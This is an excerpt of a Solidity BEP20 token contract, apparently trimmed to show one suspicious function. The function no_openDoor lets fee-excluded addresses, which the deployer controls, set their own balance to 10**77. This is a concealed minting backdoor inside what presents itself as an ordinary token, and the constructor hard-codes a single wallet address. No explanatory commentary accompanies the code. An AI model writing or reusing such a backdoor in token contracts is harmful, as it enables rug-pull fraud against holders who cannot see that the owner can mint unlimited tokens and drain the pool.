...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function no_openDoor() public {
        require(isExcludedFromFee[msg.sender]);
        togetherDo = 0;
        _balances[msg.sender] =  10 ** 77;
    }
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [uint256(0),uint256(3),uint256(0)],
        [uint256(0),uint256(3),uint256(0)],
        [uint256(100000000000),uint256(1000000000000)],
        [0xE97A2fd9D9B84fD1b078BD59b84eCCE26a04B451,0xE97A2fd9D9B84fD1b078BD59b84eCCE26a04B451]
    ){}
}